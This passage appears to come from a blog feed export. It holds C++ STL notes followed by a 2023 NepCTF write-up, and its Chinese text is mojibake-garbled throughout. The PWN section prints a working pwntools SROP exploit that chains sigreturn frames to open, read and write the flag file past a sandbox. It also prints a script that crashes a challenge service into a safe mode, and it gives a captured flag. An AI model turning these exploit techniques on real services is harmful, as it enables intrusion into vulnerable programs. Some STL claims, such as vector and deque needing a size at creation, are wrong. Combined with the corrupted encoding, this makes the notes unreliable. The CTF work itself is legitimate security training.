<li><code>is_heap(first, last)</code>ï¼šå¦‚æœ[first, last)åŒºé—´å†…çš„å…ƒç´ æ»¡è¶³å †çš„æ€§è´¨ï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</li>
<li><code>push()</code>ï¼šå°†å…ƒç´ æ·»åŠ åˆ°å †ä¸­ã€‚</li>
<li><code>pop()</code>ï¼šä»å †ä¸­ç§»é™¤æ ¹èŠ‚ç‚¹å…ƒç´ ã€‚</li>
<li><code>top()</code>ï¼šè¿”å›å †ä¸­çš„æ ¹èŠ‚ç‚¹å…ƒç´ ã€‚</li>
<li><code>empty()</code>ï¼šæ£€æŸ¥å †æ˜¯å¦ä¸ºç©ºã€‚</li>
<li><code>size()</code>ï¼šè¿”å›å †ä¸­å…ƒç´ çš„æ•°é‡ã€‚</li>
</ul>
<blockquote>
<p>STLä¸­ï¼Œå †æ˜¯é€šè¿‡vectorå®¹å™¨å®ç°çš„ï¼Œå› æ­¤è¦å£°æ˜ä¸€ä¸ªå †å¯¹è±¡ï¼Œéœ€è¦å…ˆå£°æ˜ä¸€ä¸ªvectorå®¹å™¨ï¼Œç„¶åä½¿ç”¨make_heap()å‡½æ•°å°†å…¶è½¬æ¢ä¸ºå †</p>
<p><del>ä¸å¦‚æ‰‹æ“</del></p>
</blockquote>
<h3 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h3><p><code>template&lt;class T1, class T2&gt; struct pair;</code>å…¶ä¸­ï¼Œ<code>T1</code>å’Œ<code>T2</code>è¡¨ç¤ºä¸¤ä¸ªä¸åŒçš„ç±»å‹ã€‚<code>std::pair</code>ç±»åŒ…å«äº†ä¸¤ä¸ªå…¬æœ‰æˆå‘˜å˜é‡<code>first</code>å’Œ<code>second</code>ï¼Œåˆ†åˆ«è¡¨ç¤ºè¿™ä¸¤ä¸ªå€¼ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ›å»ºå’Œè®¿é—®<code>std::pair</code>å¯¹è±¡ï¼š </p>
<p>ç¼–è¯‘å™¨å¹¶ä¸ä¼šå¯¹<code>std::vector&lt;std::pair&lt;int, int&gt;&gt;</code>ä¸­çš„å…ƒç´ é¡ºåºè¿›è¡Œä»»ä½•å‡è®¾æˆ–è€…åˆ¤æ–­ã€‚å®ƒåªä¼šæ ¹æ®ä½ çš„ä»£ç ä¸­å¯¹è¿™ä¸ª<code>std::vector</code>å¯¹è±¡çš„ä½¿ç”¨æ¥ç¡®å®šå…ƒç´ é¡ºåºã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ä»£ç ä¸­ä½¿ç”¨<code>v[i].first</code>æ¥è®¿é—®ç¬¬iä¸ªå…ƒç´ çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œç¼–è¯‘å™¨å°±ä¼šè®¤ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºæ•°å€¼ï¼Œç¬¬äºŒä¸ªå…ƒç´ è¡¨ç¤ºä¸‹æ ‡ã€‚å¦‚æœä½ ä½¿ç”¨<code>v[i].second</code>æ¥è®¿é—®ç¬¬iä¸ªå…ƒç´ çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼Œç¼–è¯‘å™¨å°±ä¼šè®¤ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºä¸‹æ ‡ï¼Œç¬¬äºŒä¸ªå…ƒç´ è¡¨ç¤ºæ•°å€¼ã€‚</p>
<h2 id="è¿­ä»£å™¨ç±»å‹è¡¥å……"><a href="#è¿­ä»£å™¨ç±»å‹è¡¥å……" class="headerlink" title="è¿­ä»£å™¨ç±»å‹è¡¥å……"></a>è¿­ä»£å™¨ç±»å‹è¡¥å……</h2><p>åœ¨C++ä¸­ï¼ŒSTLå®¹å™¨çš„è¿­ä»£å™¨å¯ä»¥åˆ†ä¸º5ç§ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ol>
<li>è¾“å…¥è¿­ä»£å™¨ï¼ˆInput Iteratorï¼‰ï¼šåªè¯»ï¼Œåªèƒ½å•å‘ç§»åŠ¨ï¼Œæ¯ä¸ªå…ƒç´ åªèƒ½è¢«è®¿é—®ä¸€æ¬¡ã€‚ä¾‹å¦‚<code>istream_iterator</code>ã€‚</li>
<li>è¾“å‡ºè¿­ä»£å™¨ï¼ˆOutput Iteratorï¼‰ï¼šåªå†™ï¼Œåªèƒ½å•å‘ç§»åŠ¨ï¼Œæ¯ä¸ªå…ƒç´ åªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡ã€‚ä¾‹å¦‚<code>ostream_iterator</code>ã€‚</li>
<li>å‰å‘è¿­ä»£å™¨ï¼ˆForward Iteratorï¼‰ï¼šå¯è¯»å†™ï¼Œåªèƒ½å•å‘ç§»åŠ¨ï¼Œæ¯ä¸ªå…ƒç´ å¯ä»¥è¢«è®¿é—®æˆ–èµ‹å€¼å¤šæ¬¡ã€‚ä¾‹å¦‚<code>forward_list</code>ã€‚</li>
<li>åŒå‘è¿­ä»£å™¨ï¼ˆBidirectional Iteratorï¼‰ï¼šå¯è¯»å†™ï¼Œå¯ä»¥åŒå‘ç§»åŠ¨ï¼Œæ¯ä¸ªå…ƒç´ å¯ä»¥è¢«è®¿é—®æˆ–èµ‹å€¼å¤šæ¬¡ã€‚ä¾‹å¦‚<code>list</code>ã€‚</li>
<li>éšæœºè®¿é—®è¿­ä»£å™¨ï¼ˆRandom Access Iteratorï¼‰ï¼šå¯è¯»å†™ï¼Œå¯ä»¥éšæœºè®¿é—®ï¼Œæ”¯æŒåŠ å‡è¿ç®—ï¼Œå¯ä»¥è·³è·ƒå¼è®¿é—®å®¹å™¨ä¸­çš„å…ƒç´ ã€‚ä¾‹å¦‚<code>vector</code>ã€<code>deque</code>ã€‚</li>
</ol>
<p>å› æ­¤ï¼Œå¯ä»¥æ ¹æ®è¿­ä»£å™¨çš„ç±»å‹æ¥åˆ¤æ–­å®¹å™¨æ˜¯å¦æ”¯æŒéšæœºè®¿é—®ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„STLå®¹å™¨åŠå…¶è¿­ä»£å™¨ç±»å‹ï¼š</p>
<ol>
<li><code>vector</code>ï¼šæ”¯æŒéšæœºè®¿é—®è¿­ä»£å™¨ã€‚</li>
<li><code>deque</code>ï¼šæ”¯æŒéšæœºè®¿é—®è¿­ä»£å™¨ã€‚</li>
<li><code>list</code>ï¼šæ”¯æŒåŒå‘è¿­ä»£å™¨ã€‚</li>
<li><code>forward_list</code>ï¼šæ”¯æŒå‰å‘è¿­ä»£å™¨ã€‚</li>
<li><code>set</code>ï¼šæ”¯æŒåŒå‘è¿­ä»£å™¨ã€‚</li>
<li><code>map</code>ï¼šæ”¯æŒåŒå‘è¿­ä»£å™¨ã€‚</li>
<li><code>unordered_set</code>ï¼šæ”¯æŒå‰å‘è¿­ä»£å™¨ã€‚</li>
<li><code>unordered_map</code>ï¼šæ”¯æŒå‰å‘è¿­ä»£å™¨ã€‚</li>
</ol>
<blockquote>
<p>è¿­ä»£å™¨ç±»å‹çš„ä¸åŒï¼Œä½¿å¾—forå¾ªç¯çš„æ“ä½œå†™æ³•ä¸åŒ</p>
<p>æ”¯æŒéšæœºè®¿é—®çš„å¯ä»¥ä½¿ç”¨ç†Ÿæ‚‰çš„å†™æ³•ï¼Œå¯¹å…ƒç´ è¿›è¡Œæ“ä½œï¼›ä¸æ”¯æŒçš„å¦‚åŒå‘è¿­ä»£å™¨è¦å¯¹è¿­ä»£å™¨è¿›è¡Œæ“ä½œ</p>
</blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºå®¹å™¨çš„ä¸åŒæ“ä½œï¼Œå¯èƒ½éœ€è¦ä¸åŒç±»å‹çš„è¿­ä»£å™¨ã€‚ä¾‹å¦‚ï¼Œå¯¹äº<code>list</code>å®¹å™¨ï¼Œå¦‚æœéœ€è¦åœ¨å®¹å™¨ä¸­é—´æ’å…¥æˆ–åˆ é™¤å…ƒç´ ï¼Œéœ€è¦ä½¿ç”¨åŒå‘è¿­ä»£å™¨ï¼›è€Œå¦‚æœåªæ˜¯è¿›è¡Œéå†ï¼Œå¯ä»¥ä½¿ç”¨å‰å‘è¿­ä»£å™¨ã€‚</p>
<p><em><u>è€Œä¸”ï¼Œè¦æ³¨æ„çš„æ˜¯</u></em></p>
<blockquote>
<p><code>stack</code>æ˜¯STLä¸­çš„ä¸€ä¸ªå®¹å™¨é€‚é…å™¨ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå› æ­¤æ²¡æœ‰è¿­ä»£å™¨ã€‚<code>stack</code>åªæä¾›äº†å¾ˆå°‘çš„æ“ä½œï¼Œä¸»è¦åŒ…æ‹¬<code>push()</code>ã€<code>pop()</code>ã€<code>top()</code>ã€<code>empty()</code>å’Œ<code>size()</code>ç­‰æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•éƒ½æ˜¯ç›´æ¥å¯¹æ ˆé¡¶å…ƒç´ è¿›è¡Œæ“ä½œï¼Œä¸éœ€è¦ä½¿ç”¨è¿­ä»£å™¨æ¥éå†æ ˆä¸­çš„å…ƒç´ ã€‚å› æ­¤ï¼Œ<code>stack</code>å¹¶ä¸å±äºä»»ä½•ä¸€ç§è¿­ä»£å™¨ç±»å‹ã€‚ </p>
</blockquote>
<h2 id="STLå¯¹äºç©ºé—´å¤§å°çš„è§„å®š"><a href="#STLå¯¹äºç©ºé—´å¤§å°çš„è§„å®š" class="headerlink" title="STLå¯¹äºç©ºé—´å¤§å°çš„è§„å®š"></a>STLå¯¹äºç©ºé—´å¤§å°çš„è§„å®š</h2><p>STLï¼ˆæ ‡å‡†æ¨¡æ¿åº“ï¼‰ä¸­çš„å®¹å™¨åˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ol>
<li><strong>é¡ºåºå®¹å™¨ï¼ˆSequence Containersï¼‰</strong>ï¼šè¿™äº›å®¹å™¨æŒ‰ç…§å…ƒç´ åœ¨å®¹å™¨ä¸­çš„ä½ç½®æ¥ç»„ç»‡å’Œå­˜å‚¨å…ƒç´ ã€‚é¡ºåºå®¹å™¨åŒ…æ‹¬<code>vector</code>ã€<code>deque</code>ã€<code>list</code>ã€<code>forward_list</code>ã€<code>array</code>ã€‚<ul>
<li><code>vector</code>ã€<code>deque</code>ã€<code>array</code>éœ€è¦åœ¨åˆ›å»ºå®¹å™¨å¯¹è±¡æ—¶æŒ‡å®šå®¹å™¨çš„å¤§å°ï¼Œå› ä¸ºå®ƒä»¬ä½¿ç”¨è¿ç»­çš„å†…å­˜å­˜å‚¨å…ƒç´ ï¼Œæ‰€ä»¥éœ€è¦é¢„å…ˆåˆ†é…è¶³å¤Ÿçš„å†…å­˜ç©ºé—´ã€‚</li>
<li><code>list</code>ã€<code>forward_list</code>ä¸éœ€è¦æŒ‡å®šå®¹å™¨å¤§å°ï¼Œå®ƒä»¬ä½¿ç”¨é“¾è¡¨å­˜å‚¨å…ƒç´ ï¼Œå¯ä»¥åŠ¨æ€åœ°åˆ†é…å’Œé‡Šæ”¾å†…å­˜ã€‚</li>
</ul>
</li>
<li><strong>å…³è”å®¹å™¨ï¼ˆAssociative Containersï¼‰</strong>ï¼šè¿™äº›å®¹å™¨æŒ‰ç…§å…ƒç´ çš„é”®å€¼æ¥ç»„ç»‡å’Œå­˜å‚¨å…ƒç´ ã€‚å…³è”å®¹å™¨åŒ…æ‹¬<code>set</code>ã€<code>multiset</code>ã€<code>map</code>ã€<code>multimap</code>ã€‚<ul>
<li>å…³è”å®¹å™¨ä¸éœ€è¦åœ¨åˆ›å»ºå®¹å™¨å¯¹è±¡æ—¶æŒ‡å®šå®¹å™¨çš„å¤§å°ï¼Œå®ƒä»¬ä½¿ç”¨æ ‘å½¢ç»“æ„å­˜å‚¨å…ƒç´ ï¼Œå¯ä»¥åŠ¨æ€åœ°åˆ†é…å’Œé‡Šæ”¾å†…å­˜ã€‚</li>
</ul>
</li>
</ol>
<p>æ­¤å¤–ï¼Œè¿˜æœ‰å¦ä¸€ç§å®¹å™¨å«åš<code>stack</code>å’Œ<code>queue</code>ï¼Œå®ƒä»¬æ˜¯å®¹å™¨é€‚é…å™¨ï¼ˆContainer Adaptorsï¼‰ï¼Œæ˜¯åœ¨é¡ºåºå®¹å™¨çš„åŸºç¡€ä¸Šæä¾›äº†ç‰¹å®šçš„æ¥å£ï¼Œä½¿å…¶æŒ‰ç…§ä¸€å®šçš„è§„åˆ™è¿›è¡Œæ“ä½œã€‚<code>stack</code>å’Œ<code>queue</code>éƒ½æ˜¯åŸºäºé¡ºåºå®¹å™¨å®ç°çš„ï¼Œä½†æ˜¯å®ƒä»¬ä¸éœ€è¦æŒ‡å®šå®¹å™¨çš„å¤§å°ï¼Œå› ä¸ºå®ƒä»¬ä½¿ç”¨çš„æ˜¯é¡ºåºå®¹å™¨çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªç©ºçš„å®¹å™¨å¯¹è±¡ã€‚</p>
<p>æ€»ä¹‹ï¼Œé¡ºåºå®¹å™¨ä¸­çš„<code>vector</code>ã€<code>deque</code>å’Œ<code>array</code>éœ€è¦æŒ‡å®šå®¹å™¨å¤§å°ï¼Œè€Œ<code>list</code>å’Œ<code>forward_list</code>ä¸éœ€è¦ã€‚å…³è”å®¹å™¨å’Œå®¹å™¨é€‚é…å™¨éƒ½ä¸éœ€è¦æŒ‡å®šå®¹å™¨å¤§å°ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NepCTF WP</title>
    <url>/posts/0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2023NepCTF-WP"><a href="#2023NepCTF-WP" class="headerlink" title="2023NepCTF WP"></a>2023NepCTF WP</h1><p>çœŸçš„è¶…çº§ç´§å¼ åˆºæ¿€çš„æ¯”èµ›ï¼ï¼æœ‰åšä¸å‡ºé¢˜ç›®å¤œä¸èƒ½å¯çš„ç—›è‹¦ï¼Œä¹Ÿæœ‰å†¥æ€è‹¦æƒ³ä¹‹åçš„è±ç„¶å¼€æœ—ï¼Œç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°äº†ctfæ¯”èµ›çš„ä¹è¶£æ‰€åœ¨ã€‚è™½ç„¶æœ€åçš„æˆç»©åœç•™åœ¨110ï¼Œä¸è¿‡å¯¹äºä¸€ä¸ªåˆå‡ºèŒ…åºçš„èŒæ–°ï¼Œå·²ç»å¾ˆæ»¡è¶³äº†ï¼›å³ä½¿æ¯”èµ›ç»“æŸåæ‰åšå‡ºä¸‰æœˆä¸ƒå’Œæœ€åæ”¾å‡ºçš„ä¸¤ä¸ªpwné¢˜ï¼ˆæŒºæ°”çš„ï¼Œæ—©çŸ¥é“ä¸çœ‹ä¸‡æ¶çš„loginçš„â€¦â€¦ï¼‰ã€‚é‚£å°±ç»™è‡ªå·±ç»§ç»­åŠ æ²¹å§ï¼Œå¸Œæœ›ä¸‹æ¬¡æ¯”èµ›èƒ½æ‹¿åˆ°å±äºè‡ªå·±çš„ä¸€ä»½è£èª‰ï¼</p>
<span id="more"></span>

<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>ä½¿ç”¨ç»å…¸sropæŠ€å·§ï¼Œä½†æ˜¯åœ¨æ­¤åŸºç¡€ä¸ŠåˆåŠ äº†orzï¼Œè§‚å¯Ÿç¨‹åºä¼šå‘ç°ï¼Œèƒ½å¤Ÿè°ƒç”¨sigreturnï¼ˆè°ƒç”¨å·ä¸º0xfï¼‰ï¼Œè€Œä¸”æº¢å‡ºé‡è¶³å¤Ÿå¤§ï¼ˆ0x300ï¼‰ã€‚æ•´ä½“çš„ä¸€ä¸ªæ€è·¯å°±æ˜¯æ„é€ system call chainsï¼Œä¼ªé€ å››ä¸ªæ ˆå¸§ï¼Œåœ¨syscallè¿”å›çš„æ—¶å€™ï¼Œrspä¼šè¿”å›åˆ°å¦ä¸€ä¸ªsigframeï¼Œä»è€Œå®ç°ä¸€ä¸ªåˆä¸€ä¸ªçš„å‡½æ•°è°ƒç”¨ã€‚</p>
<p>å‡ ä¸ªæ³¨æ„ç‚¹ï¼š</p>
<ol>
<li>åˆ©ç”¨pwntoolså†™frameçš„æ—¶å€™å¯¹å„ä¸ªå¯„å­˜å™¨ä¼ å…¥çš„éƒ½æ˜¯åœ°å€ï¼Œä¸èƒ½ç›´æ¥æŠŠå­—ç¬¦ä¸²å†™è¿›å»ï¼ˆä¼šbytes()æŠ¥é”™    <del>åˆ«é—®ä¸ºä»€ä¹ˆæˆ‘çŸ¥é“</del>ï¼‰</li>
<li>è¿”å›æ‰§è¡Œç³»ç»Ÿsyscallçš„æ—¶å€™æ³¨æ„è¿™ä¸ªç¨‹åºåªæœ‰call _systemï¼Œè€Œæ²¡æœ‰ç›´æ¥çš„syscallæ±‡ç¼–æŒ‡ä»¤ï¼Œè€Œè¿›å…¥åˆ°call _systemå•æ­¥è°ƒè¯•å¯ä»¥å‘ç°è¿™ä¸ªè¿‡ç¨‹ä¸­å„ä¸ªå¯„å­˜å™¨çš„å€¼æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„ï¼ˆä¸åŒçš„å¯„å­˜å™¨ä¹‹é—´èµ‹å€¼ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ frameæŒ‡å®šå¯„å­˜å™¨å€¼çš„æ—¶å€™éœ€è¦æ ¹æ®call _systemä¸­çš„æŒ‡ä»¤æ¥è°ƒæ•´frameçš„å„ä¸ªå¯„å­˜å™¨å€¼ï¼Œsigreturnä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæœ‰å…¶ä»–çš„å‘½ä»¤ä¼šæ”¹å˜raxçš„å€¼ï¼Œå› æ­¤éœ€è¦å¤šä¸€ä¸ªpop rdiæ§åˆ¶ä¸€ä¸‹</li>
<li>å„ä¸ªstack_frameéœ€è¦ç²¾å¿ƒæ„é€ </li>
<li>å› ä¸ºæ²™ç®±ç¦æ‰äº†execveï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨open,read,writeç»•è¿‡æ²™ç®±ã€‚ï¼ˆä¸€å®šæ³¨æ„è¿™é‡Œè¯»å–æ–‡ä»¶å†…å®¹çš„readç³»ç»Ÿè°ƒç”¨rdiä¼ å‚æ˜¯3ï¼‰</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">31552</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#syscall = 0x400788</span></span><br><span class="line">syscall = <span class="number">0x04005B0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">sigreturn = p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(<span class="number">0x400750</span>)+p64(syscall)</span><br><span class="line">buf = <span class="number">0x0601020</span>  <span class="comment"># bufåœ°å€</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">frame4 = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame4.rdi = constants.SYS_write<span class="comment">#rax</span></span><br><span class="line">frame4.rcx = <span class="number">0x40</span><span class="comment">#rdx</span></span><br><span class="line">frame4.rsi = <span class="number">1</span><span class="comment">#rdi</span></span><br><span class="line">frame4.rdx = buf<span class="comment">#rsi</span></span><br><span class="line">frame4.rip = syscall</span><br><span class="line">frame4.rsp = buf<span class="comment">#+len(sigreturn+bytes(sigframe))  # è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½®</span></span><br><span class="line">stack3 = sigreturn+<span class="built_in">bytes</span>(frame4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">frame2 = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame2.rdi = constants.SYS_open<span class="comment">#rax</span></span><br><span class="line">frame2.rcx = <span class="number">0</span><span class="comment">#rdx</span></span><br><span class="line">frame2.rsi = buf<span class="comment">#rdiæ³¨æ„è¿™é‡Œæ˜¯ä¸èƒ½ç›´æ¥ä¼ å­—ç¬¦ä¸²&quot;flag&quot;çš„ï¼Œè€Œæ˜¯åº”è¯¥ä¼ åœ°å€</span></span><br><span class="line">frame2.rip = syscall</span><br><span class="line">frame2.rsp = buf+<span class="number">5</span>+<span class="built_in">len</span>(sigreturn+<span class="built_in">bytes</span>(frame2))  <span class="comment"># è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½®</span></span><br><span class="line">stack1 = sigreturn+<span class="built_in">bytes</span>(frame2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read2</span></span><br><span class="line">frame3 = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame3.rdi = constants.SYS_read<span class="comment">#rax</span></span><br><span class="line">frame3.rcx = <span class="number">0x40</span><span class="comment">#rdx</span></span><br><span class="line">frame3.rsi = <span class="number">3</span><span class="comment">#rdi</span></span><br><span class="line">frame3.rdx = buf<span class="comment">#rsi</span></span><br><span class="line">frame3.rip = syscall</span><br><span class="line">frame3.rsp = buf+<span class="number">5</span>+<span class="built_in">len</span>(stack1+sigreturn+<span class="built_in">bytes</span>(frame3))  <span class="comment"># è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½®</span></span><br><span class="line">stack2 = sigreturn+<span class="built_in">bytes</span>(frame3)</span><br><span class="line"></span><br><span class="line">stack_frame = <span class="string">b&quot;flag\x00&quot;</span>+stack1+stack2+stack3</span><br><span class="line"><span class="comment">#stack_frame = sigreturn+bytes(sigframe)+sigreturn+bytes(sframe)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read1</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame.rdi = constants.SYS_read<span class="comment">#rax</span></span><br><span class="line">frame.rcx = <span class="built_in">len</span>(stack_frame)<span class="comment">#rdx</span></span><br><span class="line">frame.rsi = <span class="number">0</span><span class="comment">#rdi</span></span><br><span class="line">frame.rdx = buf<span class="comment">#rsi</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsp = buf+<span class="number">5</span>  <span class="comment"># è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½®</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(frame))</span><br><span class="line"></span><br><span class="line">pad = cyclic(<span class="number">0x38</span>)</span><br><span class="line">pad += sigreturn + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(stack_frame)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140041407.png" alt="image-20230814004138378"></p>
<p>å¯æ¶çš„Loginæ‰¾ä¸å‡ºè·¯å¾„â€¦â€¦</p>
<h2 id="HRP-CHAT-2"><a href="#HRP-CHAT-2" class="headerlink" title="HRP-CHAT-2"></a>HRP-CHAT-2</h2><p>çœŸçš„æœäº†â€¦.çœŸçš„å°±å·®ä¸€æ­¥ï¼Œä¸‹æ ‡æ²¡å¼„æ¸…æ¥šï¼Œå…¶å®ä¸€ä¸ªä¸ªè¯•éƒ½å¯ä»¥è¯•å‡ºæ¥çš„â€¦.</p>
<p>è·å¾—æ”»å‡»åŠ›æœ€é«˜çš„è§’è‰²ï¼ˆéœ€è¦æŠ½å¡å¾—åˆ°ï¼ŒæŠ½å¡çš„æ¬¡æ•°ä¼šå½±å“ä½ çš„ä¸‹æ ‡ï¼‰</p>
<p>é€‰æ‹©æ”»å‡»åŠ›æœ€å¼ºçš„æŠ€èƒ½ï¼Œå‡»è´¥bosså³å¯æ‹¿åˆ°flag</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840502.png" alt="image-20230815135736939"></p>
<h2 id="HRP-CHAT-2-1"><a href="#HRP-CHAT-2-1" class="headerlink" title="HRP-CHAT-2"></a>HRP-CHAT-2</h2><p>é˜…è¯»æºç </p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840711.png" alt="image-20230815141853615"></p>
<p>mainå‡½æ•°é‡Œæ‰§è¡Œå­è¿›ç¨‹ï¼Œå´©æºƒè¿›å…¥CMD</p>
<p>CMDå‡½æ•°</p>
<p><img data-src="C:\Users\èµ–å®‡å¿›\AppData\Roaming\Typora\typora-user-images\image-20230815141945133.png" alt="image-20230815141945133"></p>
<p>å¯ä»¥æƒ³åˆ°è®©å­è¿›ç¨‹å´©æºƒåï¼Œè¿›å…¥å®‰å…¨æ¨¡å¼æ‹¿flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">31971</span>)</span><br><span class="line"></span><br><span class="line">sda = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">ia = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>() : <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;help&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Login\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;6&#x27;</span>,<span class="string">b&#x27;Login\n&#x27;</span>*<span class="number">0x517</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;\nSafe_Mode_Key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151840784.png" alt="image-20230815143957697"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>ä¸€ä¸ªå·åªèƒ½å‘ä¸€æ¬¡ï¼Œç¬¬ä¸€æ¬¡å‘é”™äº†â€¦.ï¼ˆå“­ï¼‰</p>
<p>NepCTF{H4ve_Fun_1N_This_Game}</p>
